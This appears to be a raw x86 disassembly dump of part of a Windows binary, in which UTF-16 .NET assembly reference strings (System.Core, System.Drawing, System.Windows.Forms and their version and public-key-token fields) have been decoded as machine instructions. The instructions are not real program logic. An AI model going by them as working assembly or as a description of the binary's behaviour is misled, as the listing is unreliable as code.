  40789e:	jns    0x4078a0
  4078a0:	push   esp
  4078a1:	add    BYTE PTR [edi+0x0],ch
  4078a4:	imul   eax,DWORD PTR [eax],0x65
  4078a7:	add    BYTE PTR [esi+0x0],ch
  4078aa:	cmp    eax,0x31003300
  4078af:	add    BYTE PTR [edx+0x0],ah
  4078b2:	data16 add BYTE PTR [ebx],dh
  4078b5:	add    BYTE PTR [eax],bh
  4078b7:	add    BYTE PTR ds:0x61003600,dh
  4078bd:	add    BYTE PTR [eax+eax*1+0x33],ah
  4078c1:	add    BYTE PTR [esi],dh
  4078c3:	add    BYTE PTR [eax+eax*1],dh
  4078c6:	add    BYTE PTR gs:[ebx],dh
  4078c9:	add    BYTE PTR ds:0x53c08000,dh
  4078cf:	add    BYTE PTR [ecx+0x0],bh
  4078d2:	jae    0x4078d4
  4078d4:	je     0x4078d6
  4078d6:	add    BYTE PTR gs:[ebp+0x0],ch
  4078da:	add    BYTE PTR cs:[edi+0x0],dl
  4078de:	add    BYTE PTR gs:[edx+0x0],ah
  4078e2:	add    BYTE PTR cs:[eax+eax*1+0x79],al
  4078e7:	add    BYTE PTR [esi+0x0],ch
  4078ea:	popa   
  4078eb:	add    BYTE PTR [ebp+0x0],ch
  4078ee:	imul   eax,DWORD PTR [eax],0x440063
  4078f4:	popa   
  4078f5:	add    BYTE PTR [eax+eax*1+0x61],dh
  4078f9:	add    BYTE PTR [esi],ch
  4078fb:	add    BYTE PTR [eax+eax*1+0x65],al
  4078ff:	add    BYTE PTR [ebx+0x0],dh
  407902:	imul   eax,DWORD PTR [eax],0x6e0067
  407908:	sub    al,0x0
  40790a:	and    BYTE PTR [eax],al
  40790c:	push   esi
  40790d:	add    BYTE PTR [ebp+0x0],ah
  407910:	jb     0x407912
  407912:	jae    0x407914
  407914:	imul   eax,DWORD PTR [eax],0x6e006f
  40791a:	cmp    eax,0x2e003400
  40791f:	add    BYTE PTR [eax],dh
  407921:	add    BYTE PTR [esi],ch
  407923:	add    BYTE PTR [eax],dh
  407925:	add    BYTE PTR [esi],ch
  407927:	add    BYTE PTR [eax],dh
  407929:	add    BYTE PTR [eax+eax*1],ch
  40792c:	and    BYTE PTR [eax],al
  40792e:	inc    ebx
  40792f:	add    BYTE PTR [ebp+0x0],dh
  407932:	ins    BYTE PTR es:[edi],dx
  407933:	add    BYTE PTR [eax+eax*1+0x75],dh
  407937:	add    BYTE PTR [edx+0x0],dh
  40793a:	add    BYTE PTR gs:0x65006e00,bh
  407941:	add    BYTE PTR [ebp+0x0],dh
  407944:	je     0x407946
  407946:	jb     0x407948
  407948:	popa   
  407949:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40794d:	add    BYTE PTR [eax],ah
  40794f:	add    BYTE PTR [eax+0x0],dl
  407952:	jne    0x407954
  407954:	bound  eax,QWORD PTR [eax]
  407956:	ins    BYTE PTR es:[edi],dx
  407957:	add    BYTE PTR [ecx+0x0],ch
  40795a:	arpl   WORD PTR [eax],ax
  40795c:	dec    ebx
  40795d:	add    BYTE PTR [ebp+0x0],ah
  407960:	jns    0x407962
  407962:	push   esp
  407963:	add    BYTE PTR [edi+0x0],ch
  407966:	imul   eax,DWORD PTR [eax],0x65
  407969:	add    BYTE PTR [esi+0x0],ch
  40796c:	cmp    eax,0x31003300
  407971:	add    BYTE PTR [edx+0x0],ah
  407974:	data16 add BYTE PTR [ebx],dh
  407977:	add    BYTE PTR [eax],bh
  407979:	add    BYTE PTR ds:0x61003600,dh
  40797f:	add    BYTE PTR [eax+eax*1+0x33],ah
  407983:	add    BYTE PTR [esi],dh
  407985:	add    BYTE PTR [eax+eax*1],dh
  407988:	add    BYTE PTR gs:[ebx],dh
  40798b:	add    BYTE PTR ds:0x53b68000,dh
  407991:	add    BYTE PTR [ecx+0x0],bh
  407994:	jae    0x407996
  407996:	je     0x407998
  407998:	add    BYTE PTR gs:[ebp+0x0],ch
  40799c:	add    BYTE PTR cs:[edi+0x0],dl
  4079a0:	add    BYTE PTR gs:[edx+0x0],ah
  4079a4:	add    BYTE PTR cs:[ebp+0x0],al
  4079a8:	outs   dx,BYTE PTR ds:[esi]
  4079a9:	add    BYTE PTR [eax+eax*1+0x69],dh
  4079ad:	add    BYTE PTR [eax+eax*1+0x79],dh
  4079b1:	add    BYTE PTR [esi],ch
  4079b3:	add    BYTE PTR [eax+eax*1+0x65],al
  4079b7:	add    BYTE PTR [ebx+0x0],dh
  4079ba:	imul   eax,DWORD PTR [eax],0x6e0067
  4079c0:	sub    al,0x0
  4079c2:	and    BYTE PTR [eax],al
  4079c4:	push   esi
  4079c5:	add    BYTE PTR [ebp+0x0],ah
  4079c8:	jb     0x4079ca
  4079ca:	jae    0x4079cc
  4079cc:	imul   eax,DWORD PTR [eax],0x6e006f
  4079d2:	cmp    eax,0x2e003400
  4079d7:	add    BYTE PTR [eax],dh
  4079d9:	add    BYTE PTR [esi],ch
  4079db:	add    BYTE PTR [eax],dh
  4079dd:	add    BYTE PTR [esi],ch
  4079df:	add    BYTE PTR [eax],dh
  4079e1:	add    BYTE PTR [eax+eax*1],ch
  4079e4:	and    BYTE PTR [eax],al
  4079e6:	inc    ebx
  4079e7:	add    BYTE PTR [ebp+0x0],dh
  4079ea:	ins    BYTE PTR es:[edi],dx
  4079eb:	add    BYTE PTR [eax+eax*1+0x75],dh
  4079ef:	add    BYTE PTR [edx+0x0],dh
  4079f2:	add    BYTE PTR gs:0x65006e00,bh
  4079f9:	add    BYTE PTR [ebp+0x0],dh
  4079fc:	je     0x4079fe
  4079fe:	jb     0x407a00
  407a00:	popa   
  407a01:	add    BYTE PTR [eax+eax*1+0x2c],ch
  407a05:	add    BYTE PTR [eax],ah
  407a07:	add    BYTE PTR [eax+0x0],dl
  407a0a:	jne    0x407a0c
  407a0c:	bound  eax,QWORD PTR [eax]
  407a0e:	ins    BYTE PTR es:[edi],dx
  407a0f:	add    BYTE PTR [ecx+0x0],ch
  407a12:	arpl   WORD PTR [eax],ax
  407a14:	dec    ebx
  407a15:	add    BYTE PTR [ebp+0x0],ah
  407a18:	jns    0x407a1a
  407a1a:	push   esp
  407a1b:	add    BYTE PTR [edi+0x0],ch
  407a1e:	imul   eax,DWORD PTR [eax],0x65
  407a21:	add    BYTE PTR [esi+0x0],ch
  407a24:	cmp    eax,0x37006200
  407a29:	add    BYTE PTR [edi],dh
  407a2b:	add    BYTE PTR [ecx+0x0],ah
  407a2e:	xor    eax,0x35006300
  407a33:	add    BYTE PTR [esi],dh
  407a35:	add    BYTE PTR [ecx],dh
  407a37:	add    BYTE PTR [ecx],bh
  407a39:	add    BYTE PTR [ebx],dh
  407a3b:	add    BYTE PTR [eax+eax*1],dh
  407a3e:	add    BYTE PTR gs:[eax],dh
  407a41:	add    BYTE PTR [eax],bh
  407a43:	add    BYTE PTR [ecx],bh
  407a45:	add    BYTE PTR [eax+0x790053b0],al
  407a4b:	add    BYTE PTR [ebx+0x0],dh
  407a4e:	je     0x407a50
  407a50:	add    BYTE PTR gs:[ebp+0x0],ch
  407a54:	add    BYTE PTR cs:[edi+0x0],dl
  407a58:	add    BYTE PTR gs:[edx+0x0],ah
  407a5c:	add    BYTE PTR cs:[ebp+0x0],al
  407a60:	js     0x407a62
  407a62:	je     0x407a64
  407a64:	add    BYTE PTR gs:[esi+0x0],ch
  407a68:	jae    0x407a6a
  407a6a:	imul   eax,DWORD PTR [eax],0x6e006f
  407a70:	jae    0x407a72
  407a72:	sub    al,0x0
  407a74:	and    BYTE PTR [eax],al
  407a76:	push   esi
  407a77:	add    BYTE PTR [ebp+0x0],ah
  407a7a:	jb     0x407a7c
  407a7c:	jae    0x407a7e
  407a7e:	imul   eax,DWORD PTR [eax],0x6e006f
  407a84:	cmp    eax,0x2e003400
  407a89:	add    BYTE PTR [eax],dh
  407a8b:	add    BYTE PTR [esi],ch
  407a8d:	add    BYTE PTR [eax],dh
  407a8f:	add    BYTE PTR [esi],ch
  407a91:	add    BYTE PTR [eax],dh
  407a93:	add    BYTE PTR [eax+eax*1],ch
  407a96:	and    BYTE PTR [eax],al
  407a98:	inc    ebx
  407a99:	add    BYTE PTR [ebp+0x0],dh
  407a9c:	ins    BYTE PTR es:[edi],dx
  407a9d:	add    BYTE PTR [eax+eax*1+0x75],dh
  407aa1:	add    BYTE PTR [edx+0x0],dh
  407aa4:	add    BYTE PTR gs:0x65006e00,bh
  407aab:	add    BYTE PTR [ebp+0x0],dh
  407aae:	je     0x407ab0
  407ab0:	jb     0x407ab2
  407ab2:	popa   
  407ab3:	add    BYTE PTR [eax+eax*1+0x2c],ch
  407ab7:	add    BYTE PTR [eax],ah
  407ab9:	add    BYTE PTR [eax+0x0],dl
  407abc:	jne    0x407abe
  407abe:	bound  eax,QWORD PTR [eax]
  407ac0:	ins    BYTE PTR es:[edi],dx
  407ac1:	add    BYTE PTR [ecx+0x0],ch
  407ac4:	arpl   WORD PTR [eax],ax
  407ac6:	dec    ebx
  407ac7:	add    BYTE PTR [ebp+0x0],ah
  407aca:	jns    0x407acc
  407acc:	push   esp
  407acd:	add    BYTE PTR [edi+0x0],ch
  407ad0:	imul   eax,DWORD PTR [eax],0x65
  407ad3:	add    BYTE PTR [esi+0x0],ch
  407ad6:	cmp    eax,0x31003300
  407adb:	add    BYTE PTR [edx+0x0],ah
  407ade:	data16 add BYTE PTR [ebx],dh
  407ae1:	add    BYTE PTR [eax],bh
  407ae3:	add    BYTE PTR ds:0x61003600,dh
  407ae9:	add    BYTE PTR [eax+eax*1+0x33],ah
  407aed:	add    BYTE PTR [esi],dh
  407aef:	add    BYTE PTR [eax+eax*1],dh
  407af2:	add    BYTE PTR gs:[ebx],dh
  407af5:	add    BYTE PTR ds:0x53be8000,dh
  407afb:	add    BYTE PTR [ecx+0x0],bh
  407afe:	jae    0x407b00
  407b00:	je     0x407b02
  407b02:	add    BYTE PTR gs:[ebp+0x0],ch
  407b06:	add    BYTE PTR cs:[edi+0x0],dl
  407b0a:	add    BYTE PTR gs:[edx+0x0],ah
  407b0e:	add    BYTE PTR cs:[ebp+0x0],al
  407b12:	js     0x407b14
  407b14:	je     0x407b16
  407b16:	add    BYTE PTR gs:[esi+0x0],ch
  407b1a:	jae    0x407b1c
  407b1c:	imul   eax,DWORD PTR [eax],0x6e006f
  407b22:	jae    0x407b24
  407b24:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  407b29:	add    BYTE PTR [ebx+0x0],dh
  407b2c:	imul   eax,DWORD PTR [eax],0x6e0067
  407b32:	sub    al,0x0
  407b34:	and    BYTE PTR [eax],al
  407b36:	push   esi
  407b37:	add    BYTE PTR [ebp+0x0],ah
  407b3a:	jb     0x407b3c
  407b3c:	jae    0x407b3e
  407b3e:	imul   eax,DWORD PTR [eax],0x6e006f
  407b44:	cmp    eax,0x2e003400
  407b49:	add    BYTE PTR [eax],dh
  407b4b:	add    BYTE PTR [esi],ch
  407b4d:	add    BYTE PTR [eax],dh
  407b4f:	add    BYTE PTR [esi],ch
  407b51:	add    BYTE PTR [eax],dh
  407b53:	add    BYTE PTR [eax+eax*1],ch
  407b56:	and    BYTE PTR [eax],al
  407b58:	inc    ebx
  407b59:	add    BYTE PTR [ebp+0x0],dh
  407b5c:	ins    BYTE PTR es:[edi],dx
  407b5d:	add    BYTE PTR [eax+eax*1+0x75],dh
  407b61:	add    BYTE PTR [edx+0x0],dh
  407b64:	add    BYTE PTR gs:0x65006e00,bh
  407b6b:	add    BYTE PTR [ebp+0x0],dh
  407b6e:	je     0x407b70
  407b70:	jb     0x407b72
  407b72:	popa   
  407b73:	add    BYTE PTR [eax+eax*1+0x2c],ch
  407b77:	add    BYTE PTR [eax],ah
  407b79:	add    BYTE PTR [eax+0x0],dl
  407b7c:	jne    0x407b7e
  407b7e:	bound  eax,QWORD PTR [eax]
  407b80:	ins    BYTE PTR es:[edi],dx
  407b81:	add    BYTE PTR [ecx+0x0],ch
  407b84:	arpl   WORD PTR [eax],ax
  407b86:	dec    ebx
  407b87:	add    BYTE PTR [ebp+0x0],ah
  407b8a:	jns    0x407b8c
  407b8c:	push   esp
  407b8d:	add    BYTE PTR [edi+0x0],ch
  407b90:	imul   eax,DWORD PTR [eax],0x65
  407b93:	add    BYTE PTR [esi+0x0],ch
  407b96:	cmp    eax,0x31003300
  407b9b:	add    BYTE PTR [edx+0x0],ah
  407b9e:	data16 add BYTE PTR [ebx],dh
  407ba1:	add    BYTE PTR [eax],bh
  407ba3:	add    BYTE PTR ds:0x61003600,dh
  407ba9:	add    BYTE PTR [eax+eax*1+0x33],ah
  407bad:	add    BYTE PTR [esi],dh
  407baf:	add    BYTE PTR [eax+eax*1],dh
  407bb2:	add    BYTE PTR gs:[ebx],dh
  407bb5:	add    BYTE PTR ds:0x53a88000,dh
  407bbb:	add    BYTE PTR [ecx+0x0],bh
  407bbe:	jae    0x407bc0
  407bc0:	je     0x407bc2
  407bc2:	add    BYTE PTR gs:[ebp+0x0],ch
  407bc6:	add    BYTE PTR cs:[edi+0x0],dl
  407bca:	add    BYTE PTR gs:[edx+0x0],ah
  407bce:	add    BYTE PTR cs:[ebp+0x0],cl
  407bd2:	outs   dx,DWORD PTR ds:[esi]
  407bd3:	add    BYTE PTR [edx+0x0],ah
  407bd6:	imul   eax,DWORD PTR [eax],0x65006c
  407bdc:	sub    al,0x0
  407bde:	and    BYTE PTR [eax],al
  407be0:	push   esi
  407be1:	add    BYTE PTR [ebp+0x0],ah
  407be4:	jb     0x407be6
  407be6:	jae    0x407be8
  407be8:	imul   eax,DWORD PTR [eax],0x6e006f
  407bee:	cmp    eax,0x2e003400
  407bf3:	add    BYTE PTR [eax],dh
  407bf5:	add    BYTE PTR [esi],ch
  407bf7:	add    BYTE PTR [eax],dh
  407bf9:	add    BYTE PTR [esi],ch
  407bfb:	add    BYTE PTR [eax],dh
  407bfd:	add    BYTE PTR [eax+eax*1],ch
  407c00:	and    BYTE PTR [eax],al
  407c02:	inc    ebx
  407c03:	add    BYTE PTR [ebp+0x0],dh
  407c06:	ins    BYTE PTR es:[edi],dx
  407c07:	add    BYTE PTR [eax+eax*1+0x75],dh
  407c0b:	add    BYTE PTR [edx+0x0],dh
  407c0e:	add    BYTE PTR gs:0x65006e00,bh
  407c15:	add    BYTE PTR [ebp+0x0],dh
  407c18:	je     0x407c1a
  407c1a:	jb     0x407c1c
  407c1c:	popa   
  407c1d:	add    BYTE PTR [eax+eax*1+0x2c],ch
  407c21:	add    BYTE PTR [eax],ah
  407c23:	add    BYTE PTR [eax+0x0],dl
  407c26:	jne    0x407c28
  407c28:	bound  eax,QWORD PTR [eax]
  407c2a:	ins    BYTE PTR es:[edi],dx
  407c2b:	add    BYTE PTR [ecx+0x0],ch
  407c2e:	arpl   WORD PTR [eax],ax
  407c30:	dec    ebx
  407c31:	add    BYTE PTR [ebp+0x0],ah
  407c34:	jns    0x407c36
  407c36:	push   esp
  407c37:	add    BYTE PTR [edi+0x0],ch
  407c3a:	imul   eax,DWORD PTR [eax],0x65
  407c3d:	add    BYTE PTR [esi+0x0],ch
  407c40:	cmp    eax,0x30006200
  407c45:	add    BYTE PTR [ebx],dh
  407c47:	add    BYTE PTR [esi+0x0],ah
  407c4a:	xor    eax,0x37006600
  407c4f:	add    BYTE PTR [esi+0x0],ah
  407c52:	xor    DWORD PTR [eax],eax
  407c54:	xor    DWORD PTR [eax],eax
  407c56:	add    BYTE PTR fs:0x61003000,dh
  407c5d:	add    BYTE PTR [ebx],dh
  407c5f:	add    BYTE PTR [ecx+0x0],ah
  407c62:	add    al,0x53
  407c65:	add    BYTE PTR [ecx+0x0],bh
  407c68:	jae    0x407c6a
  407c6a:	je     0x407c6c
  407c6c:	add    BYTE PTR gs:[ebp+0x0],ch
  407c70:	add    BYTE PTR cs:[edi+0x0],dl
  407c74:	add    BYTE PTR gs:[edx+0x0],ah
  407c78:	add    BYTE PTR cs:[edx+0x0],dl
  407c7c:	add    BYTE PTR gs:[edi+0x0],ah
  407c80:	jne    0x407c82
  407c82:	ins    BYTE PTR es:[edi],dx
  407c83:	add    BYTE PTR [ecx+0x0],ah
  407c86:	jb     0x407c88
  407c88:	inc    ebp
  407c89:	add    BYTE PTR [eax+0x0],bh
  407c8c:	jo     0x407c8e
  407c8e:	jb     0x407c90
  407c90:	add    BYTE PTR gs:[ebx+0x0],dh
  407c94:	jae    0x407c96
  407c96:	imul   eax,DWORD PTR [eax],0x6e006f
  407c9c:	jae    0x407c9e
  407c9e:	sub    al,0x0
  407ca0:	and    BYTE PTR [eax],al
  407ca2:	push   esi
  407ca3:	add    BYTE PTR [ebp+0x0],ah
  407ca6:	jb     0x407ca8
  407ca8:	jae    0x407caa
  407caa:	imul   eax,DWORD PTR [eax],0x6e006f
  407cb0:	cmp    eax,0x2e003400
  407cb5:	add    BYTE PTR [eax],dh
  407cb7:	add    BYTE PTR [esi],ch
  407cb9:	add    BYTE PTR [eax],dh
  407cbb:	add    BYTE PTR [esi],ch
  407cbd:	add    BYTE PTR [eax],dh
  407cbf:	add    BYTE PTR [eax+eax*1],ch
  407cc2:	and    BYTE PTR [eax],al
  407cc4:	inc    ebx
  407cc5:	add    BYTE PTR [ebp+0x0],dh
  407cc8:	ins    BYTE PTR es:[edi],dx
  407cc9:	add    BYTE PTR [eax+eax*1+0x75],dh
  407ccd:	add    BYTE PTR [edx+0x0],dh
  407cd0:	add    BYTE PTR gs:0x65006e00,bh
  407cd7:	add    BYTE PTR [ebp+0x0],dh
  407cda:	je     0x407cdc
  407cdc:	jb     0x407cde
  407cde:	popa   
  407cdf:	add    BYTE PTR [eax+eax*1+0x2c],ch
  407ce3:	add    BYTE PTR [eax],ah
  407ce5:	add    BYTE PTR [eax+0x0],dl
  407ce8:	jne    0x407cea
  407cea:	bound  eax,QWORD PTR [eax]
  407cec:	ins    BYTE PTR es:[edi],dx
  407ced:	add    BYTE PTR [ecx+0x0],ch
  407cf0:	arpl   WORD PTR [eax],ax
  407cf2:	dec    ebx
  407cf3:	add    BYTE PTR [ebp+0x0],ah
  407cf6:	jns    0x407cf8
  407cf8:	push   esp
  407cf9:	add    BYTE PTR [edi+0x0],ch
  407cfc:	imul   eax,DWORD PTR [eax],0x65
  407cff:	add    BYTE PTR [esi+0x0],ch
  407d02:	cmp    eax,0x30006200
  407d07:	add    BYTE PTR [ebx],dh
  407d09:	add    BYTE PTR [esi+0x0],ah
  407d0c:	xor    eax,0x37006600
  407d11:	add    BYTE PTR [esi+0x0],ah
  407d14:	xor    DWORD PTR [eax],eax
  407d16:	xor    DWORD PTR [eax],eax
  407d18:	add    BYTE PTR fs:0x61003000,dh
  407d1f:	add    BYTE PTR [ebx],dh
  407d21:	add    BYTE PTR [ecx+0x0],ah
  407d24:	sub    BYTE PTR [edx+0x790053],0x73
  407d2b:	add    BYTE PTR [eax+eax*1+0x65],dh
  407d2f:	add    BYTE PTR [ebp+0x0],ch
  407d32:	add    BYTE PTR cs:[edi+0x0],dl
  407d36:	add    BYTE PTR gs:[edx+0x0],ah
  407d3a:	add    BYTE PTR cs:[edx+0x0],dl
  407d3e:	outs   dx,DWORD PTR ds:[esi]
  407d3f:	add    BYTE PTR [ebp+0x0],dh
  407d42:	je     0x407d44
  407d44:	imul   eax,DWORD PTR [eax],0x67006e
  407d4a:	sub    al,0x0
  407d4c:	and    BYTE PTR [eax],al
  407d4e:	push   esi
  407d4f:	add    BYTE PTR [ebp+0x0],ah
  407d52:	jb     0x407d54
  407d54:	jae    0x407d56
  407d56:	imul   eax,DWORD PTR [eax],0x6e006f
  407d5c:	cmp    eax,0x2e003400
  407d61:	add    BYTE PTR [eax],dh
  407d63:	add    BYTE PTR [esi],ch
  407d65:	add    BYTE PTR [eax],dh
  407d67:	add    BYTE PTR [esi],ch
  407d69:	add    BYTE PTR [eax],dh
  407d6b:	add    BYTE PTR [eax+eax*1],ch
  407d6e:	and    BYTE PTR [eax],al
  407d70:	inc    ebx
  407d71:	add    BYTE PTR [ebp+0x0],dh
  407d74:	ins    BYTE PTR es:[edi],dx
  407d75:	add    BYTE PTR [eax+eax*1+0x75],dh
  407d79:	add    BYTE PTR [edx+0x0],dh
  407d7c:	add    BYTE PTR gs:0x65006e00,bh
  407d83:	add    BYTE PTR [ebp+0x0],dh
  407d86:	je     0x407d88
  407d88:	jb     0x407d8a
  407d8a:	popa   
  407d8b:	add    BYTE PTR [eax+eax*1+0x2c],ch
  407d8f:	add    BYTE PTR [eax],ah
  407d91:	add    BYTE PTR [eax+0x0],dl
  407d94:	jne    0x407d96
  407d96:	bound  eax,QWORD PTR [eax]
  407d98:	ins    BYTE PTR es:[edi],dx
  407d99:	add    BYTE PTR [ecx+0x0],ch
  407d9c:	arpl   WORD PTR [eax],ax
  407d9e:	dec    ebx
  407d9f:	add    BYTE PTR [ebp+0x0],ah
  407da2:	jns    0x407da4
  407da4:	push   esp
  407da5:	add    BYTE PTR [edi+0x0],ch
  407da8:	imul   eax,DWORD PTR [eax],0x65
  407dab:	add    BYTE PTR [esi+0x0],ch
  407dae:	cmp    eax,0x31003300
  407db3:	add    BYTE PTR [edx+0x0],ah
  407db6:	data16 add BYTE PTR [ebx],dh
  407db9:	add    BYTE PTR [eax],bh
  407dbb:	add    BYTE PTR ds:0x61003600,dh
  407dc1:	add    BYTE PTR [eax+eax*1+0x33],ah
  407dc5:	add    BYTE PTR [esi],dh
  407dc7:	add    BYTE PTR [eax+eax*1],dh
  407dca:	add    BYTE PTR gs:[ebx],dh
  407dcd:	add    BYTE PTR ds:0x53ac8000,dh
  407dd3:	add    BYTE PTR [ecx+0x0],bh
  407dd6:	jae    0x407dd8
  407dd8:	je     0x407dda
  407dda:	add    BYTE PTR gs:[ebp+0x0],ch
  407dde:	add    BYTE PTR cs:[edi+0x0],dl
  407de2:	add    BYTE PTR gs:[edx+0x0],ah
  407de6:	add    BYTE PTR cs:[ebx+0x0],dl
  407dea:	add    BYTE PTR gs:[edx+0x0],dh
  407dee:	jbe    0x407df0
  407df0:	imul   eax,DWORD PTR [eax],0x650063
  407df6:	jae    0x407df8
  407df8:	sub    al,0x0
  407dfa:	and    BYTE PTR [eax],al
  407dfc:	push   esi
  407dfd:	add    BYTE PTR [ebp+0x0],ah
  407e00:	jb     0x407e02
  407e02:	jae    0x407e04
  407e04:	imul   eax,DWORD PTR [eax],0x6e006f
  407e0a:	cmp    eax,0x2e003400
  407e0f:	add    BYTE PTR [eax],dh
  407e11:	add    BYTE PTR [esi],ch
  407e13:	add    BYTE PTR [eax],dh
  407e15:	add    BYTE PTR [esi],ch
  407e17:	add    BYTE PTR [eax],dh
  407e19:	add    BYTE PTR [eax+eax*1],ch
  407e1c:	and    BYTE PTR [eax],al
  407e1e:	inc    ebx
  407e1f:	add    BYTE PTR [ebp+0x0],dh
  407e22:	ins    BYTE PTR es:[edi],dx
  407e23:	add    BYTE PTR [eax+eax*1+0x75],dh
  407e27:	add    BYTE PTR [edx+0x0],dh
  407e2a:	add    BYTE PTR gs:0x65006e00,bh
  407e31:	add    BYTE PTR [ebp+0x0],dh
  407e34:	je     0x407e36
  407e36:	jb     0x407e38
  407e38:	popa   
  407e39:	add    BYTE PTR [eax+eax*1+0x2c],ch
  407e3d:	add    BYTE PTR [eax],ah
  407e3f:	add    BYTE PTR [eax+0x0],dl
  407e42:	jne    0x407e44
  407e44:	bound  eax,QWORD PTR [eax]
  407e46:	ins    BYTE PTR es:[edi],dx
  407e47:	add    BYTE PTR [ecx+0x0],ch
  407e4a:	arpl   WORD PTR [eax],ax
  407e4c:	dec    ebx
  407e4d:	add    BYTE PTR [ebp+0x0],ah
  407e50:	jns    0x407e52
  407e52:	push   esp
  407e53:	add    BYTE PTR [edi+0x0],ch
  407e56:	imul   eax,DWORD PTR [eax],0x65
  407e59:	add    BYTE PTR [esi+0x0],ch
  407e5c:	cmp    eax,0x30006200
  407e61:	add    BYTE PTR [ebx],dh
  407e63:	add    BYTE PTR [esi+0x0],ah
  407e66:	xor    eax,0x37006600
  407e6b:	add    BYTE PTR [esi+0x0],ah
  407e6e:	xor    DWORD PTR [eax],eax
  407e70:	xor    DWORD PTR [eax],eax
  407e72:	add    BYTE PTR fs:0x61003000,dh
  407e79:	add    BYTE PTR [ebx],dh
  407e7b:	add    BYTE PTR [ecx+0x0],ah
  407e7e:	sbb    BYTE PTR [edi+edx*2+0x6e006900],0x0
  407e86:	add    BYTE PTR fs:[edi+0x0],ch
  407e8a:	ja     0x407e8c
  407e8c:	jae    0x407e8e
  407e8e:	inc    edx
  407e8f:	add    BYTE PTR [ecx+0x0],ah
  407e92:	jae    0x407e94
  407e94:	add    BYTE PTR gs:[eax+eax*1],ch
  407e98:	and    BYTE PTR [eax],al
  407e9a:	push   esi
  407e9b:	add    BYTE PTR [ebp+0x0],ah
  407e9e:	jb     0x407ea0
  407ea0:	jae    0x407ea2
  407ea2:	imul   eax,DWORD PTR [eax],0x6e006f
  407ea8:	cmp    eax,0x2e003400
  407ead:	add    BYTE PTR [eax],dh
  407eaf:	add    BYTE PTR [esi],ch
  407eb1:	add    BYTE PTR [eax],dh
  407eb3:	add    BYTE PTR [esi],ch
  407eb5:	add    BYTE PTR [eax],dh
  407eb7:	add    BYTE PTR [eax+eax*1],ch
  407eba:	and    BYTE PTR [eax],al
  407ebc:	inc    ebx
  407ebd:	add    BYTE PTR [ebp+0x0],dh
  407ec0:	ins    BYTE PTR es:[edi],dx
  407ec1:	add    BYTE PTR [eax+eax*1+0x75],dh
  407ec5:	add    BYTE PTR [edx+0x0],dh
  407ec8:	add    BYTE PTR gs:0x65006e00,bh
  407ecf:	add    BYTE PTR [ebp+0x0],dh
  407ed2:	je     0x407ed4
  407ed4:	jb     0x407ed6
  407ed6:	popa   
  407ed7:	add    BYTE PTR [eax+eax*1+0x2c],ch
  407edb:	add    BYTE PTR [eax],ah
  407edd:	add    BYTE PTR [eax+0x0],dl
  407ee0:	jne    0x407ee2
  407ee2:	bound  eax,QWORD PTR [eax]
  407ee4:	ins    BYTE PTR es:[edi],dx
  407ee5:	add    BYTE PTR [ecx+0x0],ch
  407ee8:	arpl   WORD PTR [eax],ax
  407eea:	dec    ebx
  407eeb:	add    BYTE PTR [ebp+0x0],ah
  407eee:	jns    0x407ef0
  407ef0:	push   esp
  407ef1:	add    BYTE PTR [edi+0x0],ch
  407ef4:	imul   eax,DWORD PTR [eax],0x65
  407ef7:	add    BYTE PTR [esi+0x0],ch
  407efa:	cmp    eax,0x31003300
  407eff:	add    BYTE PTR [edx+0x0],ah
  407f02:	data16 add BYTE PTR [ebx],dh
  407f05:	add    BYTE PTR [eax],bh
  407f07:	add    BYTE PTR ds:0x61003600,dh
  407f0d:	add    BYTE PTR [eax+eax*1+0x33],ah
  407f11:	add    BYTE PTR [esi],dh
  407f13:	add    BYTE PTR [eax+eax*1],dh
  407f16:	add    BYTE PTR gs:[ebx],dh
  407f19:	add    BYTE PTR ds:0x4db28000,dh
  407f1f:	add    BYTE PTR [ecx+0x0],ch
  407f22:	arpl   WORD PTR [eax],ax
  407f24:	jb     0x407f26
  407f26:	outs   dx,DWORD PTR ds:[esi]
  407f27:	add    BYTE PTR [ebx+0x0],dh
  407f2a:	outs   dx,DWORD PTR ds:[esi]
  407f2b:	add    BYTE PTR [esi+0x0],ah
  407f2e:	je     0x407f30
  407f30:	add    BYTE PTR cs:[esi+0x0],dl
  407f34:	imul   eax,DWORD PTR [eax],0x750073
  407f3a:	popa   
  407f3b:	add    BYTE PTR [eax+eax*1+0x53],ch
  407f3f:	add    BYTE PTR [eax+eax*1+0x75],dh
  407f43:	add    BYTE PTR [eax+eax*1+0x69],ah
  407f47:	add    BYTE PTR [edi+0x0],ch
  407f4a:	sub    al,0x0
  407f4c:	and    BYTE PTR [eax],al
  407f4e:	push   esi
  407f4f:	add    BYTE PTR [ebp+0x0],ah
  407f52:	jb     0x407f54
  407f54:	jae    0x407f56
  407f56:	imul   eax,DWORD PTR [eax],0x6e006f
  407f5c:	cmp    eax,0x2e003400
  407f61:	add    BYTE PTR [eax],dh
  407f63:	add    BYTE PTR [esi],ch
  407f65:	add    BYTE PTR [eax],dh
  407f67:	add    BYTE PTR [esi],ch
  407f69:	add    BYTE PTR [eax],dh
  407f6b:	add    BYTE PTR [eax+eax*1],ch
  407f6e:	and    BYTE PTR [eax],al
  407f70:	inc    ebx
  407f71:	add    BYTE PTR [ebp+0x0],dh
  407f74:	ins    BYTE PTR es:[edi],dx
  407f75:	add    BYTE PTR [eax+eax*1+0x75],dh
  407f79:	add    BYTE PTR [edx+0x0],dh
  407f7c:	add    BYTE PTR gs:0x65006e00,bh
  407f83:	add    BYTE PTR [ebp+0x0],dh
  407f86:	je     0x407f88
  407f88:	jb     0x407f8a
  407f8a:	popa   
  407f8b:	add    BYTE PTR [eax+eax*1+0x2c],ch
  407f8f:	add    BYTE PTR [eax],ah
  407f91:	add    BYTE PTR [eax+0x0],dl
  407f94:	jne    0x407f96
  407f96:	bound  eax,QWORD PTR [eax]
  407f98:	ins    BYTE PTR es:[edi],dx
  407f99:	add    BYTE PTR [ecx+0x0],ch
  407f9c:	arpl   WORD PTR [eax],ax
  407f9e:	dec    ebx
  407f9f:	add    BYTE PTR [ebp+0x0],ah
  407fa2:	jns    0x407fa4
  407fa4:	push   esp
  407fa5:	add    BYTE PTR [edi+0x0],ch
  407fa8:	imul   eax,DWORD PTR [eax],0x65
  407fab:	add    BYTE PTR [esi+0x0],ch
  407fae:	cmp    eax,0x30006200
  407fb3:	add    BYTE PTR [ebx],dh
  407fb5:	add    BYTE PTR [esi+0x0],ah
  407fb8:	xor    eax,0x37006600
  407fbd:	add    BYTE PTR [esi+0x0],ah
  407fc0:	xor    DWORD PTR [eax],eax
  407fc2:	xor    DWORD PTR [eax],eax
